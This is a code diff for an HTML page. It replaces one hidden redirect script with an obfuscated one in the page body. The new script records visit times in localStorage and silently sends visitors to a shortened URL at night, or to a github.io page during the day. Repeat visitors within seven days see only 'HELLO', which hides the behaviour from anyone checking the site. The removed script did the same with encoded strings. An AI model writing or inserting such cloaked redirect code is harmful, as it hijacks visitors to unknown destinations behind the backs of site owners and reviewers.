@@ -35,53 +35,8 @@
 	<body>
 				
 <script>
-(function(){
-
-var _f = function(a){
-var s="";
-for(var i=0;i<a.length;i++){
-s += String.fromCharCode(a[i]-1);
-}
-return atob(s);
-};
-
-var _key = _f([101,109,123,106,116,102,101,96,117,106,110,102]); // visited_time
-
-var _now = Date.now();
-var _old = localStorage.getItem(_key);
-
-var _free = 180000;
-var _lock = 604800000;
-
-function _go(){
-var h = new Date().getHours();
-
-var _n = _f([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]);
-var _d = _f([98,73,83,49,100,73,84,79,55,78,121,78,117,98,71,57,116,76,122,65,61]);
-
-location.href = (h>=20||h<5)?_n:_d;
-}
-
-if(_old){
-var diff = _now - _old;
-
-if(diff < _free){
-_go();
-}
-else if(diff < _lock){
-document.body.innerHTML="<h2>HELLO</h2>";
-}
-else{
-localStorage.setItem(_key,_now);
-_go();
-}
-
-}else{
-localStorage.setItem(_key,_now);
-_go();
-}
-
-})();
+/*  */var _0x52aba2=_0x1d95;(function(_0x4efc31,_0x156e55){var _0x34d930=_0x1d95,_0x2d8d5d=_0x4efc31();while(!![]){try{var _0x367e93=-parseInt(_0x34d930(0x1a5))/0x1*(parseInt(_0x34d930(0x1a7))/0x2)+parseInt(_0x34d930(0x1aa))/0x3*(-parseInt(_0x34d930(0x1a9))/0x4)+-parseInt(_0x34d930(0x19e))/0x5+-parseInt(_0x34d930(0x1a0))/0x6*(parseInt(_0x34d930(0x1ae))/0x7)+parseInt(_0x34d930(0x19c))/0x8*(-parseInt(_0x34d930(0x19f))/0x9)+-parseInt(_0x34d930(0x19d))/0xa*(parseInt(_0x34d930(0x1a4))/0xb)+parseInt(_0x34d930(0x1ab))/0xc;if(_0x367e93===_0x156e55)break;else _0x2d8d5d['push'](_0x2d8d5d['shift']());}catch(_0x267a7b){_0x2d8d5d['push'](_0x2d8d5d['shift']());}}}(_0x1e55,0x4b697));var key=_0x52aba2(0x1ad),now=Date[_0x52aba2(0x1a2)](),savedTime=localStorage['getItem'](key),delayLock=0x3*0x3c*0x3e8,limit7day=0x7*0x18*0x3c*0x3c*0x3e8;function redirectByHour(){var _0x4d813a=_0x52aba2,_0x3bd5aa=new Date()['getHours']();_0x3bd5aa>=0x14||_0x3bd5aa<0x5?location[_0x4d813a(0x1a6)]=_0x4d813a(0x1a8):location[_0x4d813a(0x1a6)]='https://minhaffs.github.io/phimtrung/overload.html';}function _0x1e55(){var _0x37463b=['611637OxqUoD','17706552TZKfXS','<h2>HELLO</h2>','visited_time','196iDLUEJ','3206712lQFJXV','150XDMTsE','662445pclDId','9blIiUj','58632gwqnBm','setItem','now','innerHTML','74173GyCpam','4207LKlWPb','href','26vBKvgE','https://shorturl.at/pA9PC','4BhnYWz'];_0x1e55=function(){return _0x37463b;};return _0x1e55();}function _0x1d95(_0x116062,_0x899e4){_0x116062=_0x116062-0x19c;var _0x1e5576=_0x1e55();var _0x1d9580=_0x1e5576[_0x116062];return _0x1d9580;}if(savedTime){var diff=now-savedTime;if(diff<delayLock)redirectByHour();else diff<limit7day?document['body'][_0x52aba2(0x1a3)]=_0x52aba2(0x1ac):(localStorage[_0x52aba2(0x1a1)](key,now),redirectByHour());}else localStorage[_0x52aba2(0x1a1)](key,now),redirectByHour();
+	
 </script>
 	</body>
 	</html>
